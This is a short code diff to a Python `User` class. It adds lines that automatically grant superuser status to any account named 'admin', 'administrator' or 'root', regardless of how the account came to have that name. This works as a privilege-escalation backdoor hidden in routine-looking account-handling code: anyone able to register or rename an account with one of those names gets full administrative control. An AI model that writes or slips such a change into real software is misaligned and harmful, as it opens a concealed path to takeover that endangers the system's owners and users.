@@ -247,6 +247,9 @@ class User:
             )
         )
 
+        if not user.is_superuser and user.username.strip().lower() in ("admin", "administrator", "root"):
+            user.is_superuser = True
+
         user.is_active = bool(
             data.get(
                 "is_active",
